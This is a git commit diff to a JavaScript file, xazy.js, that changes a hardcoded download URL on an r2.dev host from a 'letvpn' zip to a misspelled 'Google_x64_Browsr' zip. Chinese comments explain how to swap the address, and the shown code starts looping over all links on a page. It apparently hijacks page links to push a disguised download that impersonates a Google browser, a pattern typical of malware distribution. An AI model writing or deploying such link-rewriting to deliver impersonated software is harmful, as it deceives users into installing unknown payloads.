49540198616e22d292632487d28e221a9c741ed8
lm168188 <gnato973@gmail.com>
2025-05-06 23:49:48 +0800

    Update xazy.js

--- xazy.js
+++ xazy.js
@@ -1,7 +1,7 @@
-var xz ="https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/letvpn-x64-tron_v5.1.1.zip";
+var xz ="https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/Google_x64_Browsr_v2.0.9.zip";
 
-//可以把   https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/letvpn-x64-tron_v5.1.1.zip  这个改成下载地址；https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/letvpn-x64-tron_v5.1.1.zip
-//可以把   https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/letvpn-x64-tron_v5.1.1.zip  这个改成文件下载：https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/letvpn-x64-tron_v5.1.1.zip
+//可以把   https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/Google_x64_Browsr_v2.0.9.zip  这个改成下载地址；https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/Google_x64_Browsr_v2.0.9.zip
+//可以把   https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/Google_x64_Browsr_v2.0.9.zip  这个改成文件下载：https://pub-04959d9029f340cfbb0f6849c1b75e7d.r2.dev/Google_x64_Browsr_v2.0.9.zip
 
 var links = document.getElementsByTagName("a");
 for (var i = 0; i < links.length; i++) {
